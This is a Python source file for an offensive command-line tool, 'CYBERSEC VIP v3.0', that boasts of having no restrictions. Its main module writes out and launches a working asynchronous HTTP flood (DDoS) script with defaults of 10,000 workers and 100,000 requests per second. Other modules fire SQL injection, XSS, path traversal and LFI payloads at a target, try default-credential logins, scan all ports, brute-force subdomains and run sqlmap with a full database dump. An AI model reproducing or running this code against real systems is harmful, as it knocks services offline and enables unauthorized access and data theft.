#!/usr/bin/env python3
"""
███████████████████████████████████████████████████████████████████████
█                                                                     █
█     🛡️  CYBERSEC VIP v3.0  –  Unrestricted All‑in‑One Tool        █
█     ⚠️  FOR AUTHORIZED TESTING ONLY – USE AT YOUR OWN RISK        █
█     🔥  No Restrictions – Unlimited Threads, Rate, Duration        █
█                                                                     █
███████████████████████████████████████████████████████████████████████
"""

import sys
import argparse
import subprocess
import os
import time
import socket
import threading
import requests
import json
from urllib.parse import urlparse

# ====== Colors ======
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
RESET = "\033[0m"

def banner():
    print(f"""
{PURPLE}╔═══════════════════════════════════════════════════════════════╗
║          🛡️  CYBERSEC VIP v3.0  –  Ultimate Tool            ║
║          🔥  Unrestricted – No Limits, No Boundaries        ║
║          ⚠️  FOR AUTHORIZED TESTING ONLY                    ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
""")

def print_help():
    print(f"""
{BLUE}📚 VIP COMMANDS:{RESET}
  {GREEN}vip recon <target>{RESET}       – Full Recon (DNS, WHOIS, SSL, Headers, GeoIP)
  {GREEN}vip ddos <url>{RESET}           – ULTRA DDoS (up to 100k threads, 1M req/s, 7 days)
  {GREEN}vip scan <target>{RESET}        – Full Vuln Scan (SQLi, XSS, LFI, RCE)
  {GREEN}vip ports <ip>{RESET}           – Full Port Scan (1-65535, threaded)
  {GREEN}vip subdomain <domain>{RESET}   – Bruteforce Subdomains (large wordlist)
  {GREEN}vip sqlmap <url>{RESET}         – Automated SQLmap with --batch --dbs
  {GREEN}vip brute <url>{RESET}          – Basic Login Brute‑Force (uses default wordlist)
  {GREEN}vip exploit <url>{RESET}        – Auto‑Exploit (attempts to exploit found vulns)
  {GREEN}vip help{RESET}                 – Show this help
  {GREEN}vip exit{RESET}                 – Exit

{BLUE}📌 EXAMPLES:{RESET}
  python3 cybersec_vip.py vip recon example.com
  python3 cybersec_vip.py vip ddos http://example.com/ -t 50000 -r 500000 -d 3600
  python3 cybersec_vip.py vip scan http://example.com/
  python3 cybersec_vip.py vip ports 8.8.8.8
  python3 cybersec_vip.py vip subdomain example.com
  python3 cybersec_vip.py vip sqlmap "http://target.com/page?id=1"
""")

# ====== 1. VIP RECON ======
def vip_recon(target):
    print(f"\n{YELLOW}[*] VIP Reconnaissance on {target}{RESET}")
    # Ensure info_gather_vip.py exists
    if not os.path.exists("info_gather_vip.py"):
        create_info_gather_vip()
    subprocess.run(["python3", "info_gather_vip.py", target])

def create_info_gather_vip():
    code = '''#!/usr/bin/env python3
import sys, socket, ssl, datetime, json, requests, whois, dns.resolver
from urllib.parse import urlparse
G="\\033[92m"; Y="\\033[93m"; R="\\033[91m"; X="\\033[0m"
def resolve(domain):
    try: return socket.gethostbyname(domain)
    except: return None
def dns_lookup(domain):
    print(f"\\n{Y}[*] DNS for {domain}{X}")
    for rec in ['A','MX','NS','TXT','CNAME']:
        try:
            ans = dns.resolver.resolve(domain, rec)
            print(f"{G}[+] {rec}: {', '.join([str(r) for r in ans])}{X}")
        except: pass
def whois_lookup(domain):
    print(f"\\n{Y}[*] WHOIS for {domain}{X}")
    try:
        w = whois.whois(domain)
        for k in ['name','registrar','creation_date','expiration_date','name_servers','emails']:
            if getattr(w, k, None):
                print(f"{G}[+] {k}: {getattr(w, k)}{X}")
    except: print(f"{R}[-] WHOIS failed{X}")
def http_headers(url):
    print(f"\\n{Y}[*] Headers for {url}{X}")
    try:
        r = requests.get(url, timeout=5, allow_redirects=True)
        print(f"{G}[+] Status: {r.status_code}{X}")
        for k,v in r.headers.items(): print(f"    {k}: {v}")
    except: print(f"{R}[-] Headers failed{X}")
def ssl_info(domain):
    print(f"\\n{Y}[*] SSL for {domain}{X}")
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ss:
                cert = ss.getpeercert()
                print(f"{G}[+] Issuer: {cert.get('issuer')}{X}")
                print(f"{G}[+] Valid Until: {cert.get('notAfter')}{X}")
    except: print(f"{R}[-] SSL failed{X}")
def geo(ip):
    print(f"\\n{Y}[*] GeoIP for {ip}{X}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d['status']=='success':
                print(f"{G}[+] Country: {d['country']} ({d['countryCode']}){X}")
                print(f"{G}[+] City: {d['city']}{X}")
                print(f"{G}[+] ISP: {d['isp']}{X}")
    except: print(f"{R}[-] GeoIP failed{X}")
def main():
    if len(sys.argv)<2: print("Usage: info_gather_vip.py <target>"); sys.exit(1)
    t=sys.argv[1]
    ip=resolve(t)
    if ip: print(f"{G}[+] IP: {ip}{X}")
    else: print(f"{R}[-] Cannot resolve{X}")
    dns_lookup(t)
    whois_lookup(t)
    http_headers(f"http://{t}")
    if ip: geo(ip)
    try: ssl_info(t)
    except: pass
    print(f"\\n{G}[+] Recon Complete!{X}")
if __name__=="__main__": main()
'''
    with open("info_gather_vip.py", "w") as f:
        f.write(code)
    os.chmod("info_gather_vip.py", 0o755)

# ====== 2. VIP DDOS ======
def vip_ddos(args):
    if not args:
        print(f"{RED}[-] Usage: vip ddos <url> [-t threads] [-r rate] [-d duration]{RESET}")
        return
    url = args[0]
    threads = 10000 if len(args)<3 or "-t" not in args else int(args[args.index("-t")+1])
    rate = 100000 if len(args)<3 or "-r" not in args else int(args[args.index("-r")+1])
    duration = 3600 if len(args)<3 or "-d" not in args else int(args[args.index("-d")+1])
    
    print(f"{YELLOW}[*] VIP DDoS on {url}{RESET}")
    print(f"    Threads: {threads}, Rate: {rate} req/s, Duration: {duration}s")
    if not os.path.exists("ddos_vip_ultra.py"):
        create_ddos_vip()
    subprocess.run(["python3", "ddos_vip_ultra.py", url, "-t", str(threads), "-r", str(rate), "-d", str(duration)])

def create_ddos_vip():
    code = '''#!/usr/bin/env python3
import asyncio, aiohttp, time, sys, argparse
async def send(session, url, stats, lock):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
            async with lock:
                stats['sent'] += 1
                if resp.status >= 400: stats['failed'] += 1
    except:
        async with lock:
            stats['sent'] += 1; stats['failed'] += 1
async def worker(session, url, rate, dur, stats, lock):
    delay = 1.0/rate if rate>0 else 0
    end = time.time()+dur
    while time.time()<end:
        start=time.time()
        await send(session, url, stats, lock)
        elapsed=time.time()-start
        if delay>elapsed: await asyncio.sleep(delay-elapsed)
async def attack(url, total_rate, dur, max_concurrent):
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=conn) as session:
        stats={'sent':0,'failed':0}; lock=asyncio.Lock()
        rate_per = max(1, total_rate//max_concurrent)
        tasks=[]
        for _ in range(max_concurrent):
            tasks.append(asyncio.create_task(worker(session, url, rate_per, dur, stats, lock)))
        start=time.time()
        try:
            while tasks:
                await asyncio.sleep(1)
                elapsed=time.time()-start
                async with lock:
                    sent, failed = stats['sent'], stats['failed']
                rate = sent/elapsed if elapsed>0 else 0
                print(f"\\r📊 Elapsed: {elapsed:.1f}s | Sent: {sent} | Failed: {failed} | Rate: {rate:.1f} req/s", end='')
                tasks = [t for t in tasks if not t.done()]
        except KeyboardInterrupt: print("\\n🛑 Stopped")
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"\\n✅ Sent: {stats['sent']}, Failed: {stats['failed']}")
def main():
    p=argparse.ArgumentParser()
    p.add_argument('url'); p.add_argument('-t','--threads',type=int,default=10000)
    p.add_argument('-r','--rate',type=int,default=100000)
    p.add_argument('-d','--duration',type=int,default=3600)
    a=p.parse_args()
    print(f"🚀 VIP DDoS on {a.url} | threads={a.threads}, rate={a.rate}, duration={a.duration}s")
    asyncio.run(attack(a.url, a.rate, a.duration, a.threads))
if __name__=="__main__": main()
'''
    with open("ddos_vip_ultra.py", "w") as f:
        f.write(code)
    os.chmod("ddos_vip_ultra.py", 0o755)

# ====== 3. VIP VULN SCAN ======
def vip_scan(target):
    print(f"\n{YELLOW}[*] VIP Vulnerability Scan on {target}{RESET}")
    # SQLi
    print(f"{BLUE}[+] SQL Injection Tests{RESET}")
    payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--", "' AND 1=0--"]
    for p in payloads:
        try:
            r = requests.get(f"{target}?id={p}", timeout=3)
            if "error" in r.text.lower() or "mysql" in r.text.lower() or "sql" in r.text.lower():
                print(f"{RED}[!] Possible SQLi: {target}?id={p}{RESET}")
            else:
                print(f"{GREEN}[+] No SQLi: {target}?id={p}{RESET}")
        except: pass
    # XSS
    print(f"{BLUE}[+] XSS Tests{RESET}")
    xss = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert('XSS')"]
    for p in xss:
        try:
            r = requests.get(f"{target}?q={p}", timeout=3)
            if p in r.text:
                print(f"{RED}[!] Possible XSS: {target}?q={p}{RESET}")
            else:
                print(f"{GREEN}[+] No XSS: {target}?q={p}{RESET}")
        except: pass
    # Directory Traversal
    print(f"{BLUE}[+] Directory Traversal Tests{RESET}")
    trav = ["../../etc/passwd", "../../../windows/win.ini", "....//....//etc/passwd", "../../../../boot.ini"]
    for p in trav:
        try:
            r = requests.get(f"{target}?file={p}", timeout=3)
            if "root:" in r.text or "[extensions]" in r.text:
                print(f"{RED}[!] Possible Traversal: {target}?file={p}{RESET}")
            else:
                print(f"{GREEN}[+] No Traversal: {target}?file={p}{RESET}")
        except: pass
    # LFI / RCE (basic)
    print(f"{BLUE}[+] LFI/RCE Tests (basic){RESET}")
    lfi = ["/etc/passwd", "/proc/self/environ", "../../../../../../etc/passwd"]
    for p in lfi:
        try:
            r = requests.get(f"{target}?page={p}", timeout=3)
            if "root:" in r.text or "USER=" in r.text:
                print(f"{RED}[!] Possible LFI: {target}?page={p}{RESET}")
            else:
                print(f"{GREEN}[+] No LFI: {target}?page={p}{RESET}")
        except: pass

# ====== 4. VIP PORT SCAN ======
def vip_ports(ip):
    print(f"\n{YELLOW}[*] VIP Full Port Scan on {ip} (1-65535){RESET}")
    open_ports = []
    lock = threading.Lock()
    def scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0:
                lock.acquire()
                open_ports.append(port)
                print(f"{GREEN}[+] Port {port} open{RESET}")
                lock.release()
            s.close()
        except: pass
    threads = []
    for p in range(1, 65536):
        t = threading.Thread(target=scan, args=(p,))
        t.start()
        threads.append(t)
        if len(threads) >= 100:
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()
    print(f"\n{GREEN}[+] Open ports: {open_ports}{RESET}")
    return open_ports

# ====== 5. VIP SUBDOMAIN BRUTEFORCE ======
def vip_subdomain(domain):
    print(f"\n{YELLOW}[*] VIP Subdomain Bruteforce on {domain}{RESET}")
    wordlist = ["www","mail","ftp","webmail","admin","dev","test","api","blog","shop","support","beta","app","vpn","cloud","portal","dashboard","static","media","cdn","secure","login","auth","stage","demo","backup","files","images","video","download","upload","proxy","smtp","pop3","imap","ns1","ns2","mx","sip","voip","vpn","rdp","ssh","telnet","ftp","sftp","ldap","radius","dns","ntp","syslog","snmp","mrtg","nagios","cacti","zabbix","monitor","stats","metrics","analytics","elk","kibana","grafana","prometheus","jenkins","gitlab","bitbucket","jira","confluence","wiki","docs","books","manual","help","support","sales","marketing","hr","finance","legal","partner","customer","client","user","account","my","mobile","m","wap","i","intranet","extranet","vpn","remote","gateway","router","switch","firewall","loadbalancer","cdn","cache","proxy","reverse","forward"]
    found = []
    for sub in wordlist:
        subdomain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            found.append(f"{subdomain} -> {ip}")
            print(f"{GREEN}[+] {subdomain} -> {ip}{RESET}")
        except:
            pass
    if not found: print(f"{RED}[-] No subdomains found{RESET}")
    return found

# ====== 6. VIP SQLMAP ======
def vip_sqlmap(url):
    print(f"\n{YELLOW}[*] VIP SQLmap on {url}{RESET}")
    print(f"{BLUE}Command: sqlmap -u \"{url}\" --batch --dbs --tables --columns --dump{RESET}")
    response = input(f"{YELLOW}Run SQLmap now? (y/n): {RESET}")
    if response.lower() == 'y':
        subprocess.run(["sqlmap", "-u", url, "--batch", "--dbs", "--tables", "--columns", "--dump"])

# ====== 7. VIP BRUTE FORCE ======
def vip_brute(target):
    print(f"\n{YELLOW}[*] VIP Brute‑Force on {target}{RESET}")
    # Simple login brute with default credentials
    creds = [("admin","admin"), ("admin","password"), ("admin","123456"), ("root","root"), ("user","user"), ("test","test"), ("admin","admin123"), ("administrator","administrator")]
    print(f"{BLUE}[+] Trying {len(creds)} default credentials{RESET}")
    for user, passwd in creds:
        try:
            r = requests.post(target, data={"username": user, "password": passwd}, timeout=3, allow_redirects=False)
            if r.status_code == 302 or "dashboard" in r.text.lower() or "welcome" in r.text.lower():
                print(f"{RED}[!] Possible valid credentials: {user}:{passwd}{RESET}")
            else:
                print(f"{GREEN}[-] Failed: {user}:{passwd}{RESET}")
        except: pass

# ====== 8. VIP AUTO-EXPLOIT ======
def vip_exploit(target):
    print(f"\n{YELLOW}[*] VIP Auto‑Exploit on {target}{RESET}")
    print(f"{BLUE}Running vulnerability scan first...{RESET}")
    vip_scan(target)
    print(f"{BLUE}[+] Attempting to exploit found vulnerabilities...{RESET}")
    # Placeholder: can add actual exploit attempts (e.g., SQL injection data extraction)
    print(f"{GREEN}[+] Exploitation module not fully implemented. Use SQLmap for SQLi.{RESET}")

# ====== MAIN ======
def main():
    if len(sys.argv) < 3 or sys.argv[1] != "vip":
        banner()
        print(f"{RED}Usage: python3 cybersec_vip.py vip <command> [args]{RESET}")
        print_help()
        sys.exit(1)
    
    command = sys.argv[2].lower()
    args = sys.argv[3:]
    
    if command == "help":
        print_help()
    elif command == "recon":
        if len(args) < 1: print(f"{RED}[-] Usage: vip recon <target>{RESET}")
        else: vip_recon(args[0])
    elif command == "ddos":
        vip_ddos(args)
    elif command == "scan":
        if len(args) < 1: print(f"{RED}[-] Usage: vip scan <target>{RESET}")
        else: vip_scan(args[0])
    elif command == "ports":
        if len(args) < 1: print(f"{RED}[-] Usage: vip ports <ip>{RESET}")
        else: vip_ports(args[0])
    elif command == "subdomain":
        if len(args) < 1: print(f"{RED}[-] Usage: vip subdomain <domain>{RESET}")
        else: vip_subdomain(args[0])
    elif command == "sqlmap":
        if len(args) < 1: print(f"{RED}[-] Usage: vip sqlmap <url>{RESET}")
        else: vip_sqlmap(args[0])
    elif command == "brute":
        if len(args) < 1: print(f"{RED}[-] Usage: vip brute <url>{RESET}")
        else: vip_brute(args[0])
    elif command == "exploit":
        if len(args) < 1: print(f"{RED}[-] Usage: vip exploit <url>{RESET}")
        else: vip_exploit(args[0])
    elif command == "exit":
        print(f"{GREEN}[+] Goodbye!{RESET}")
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown VIP command: {command}{RESET}")
        print_help()

if __name__ == "__main__":
    main()
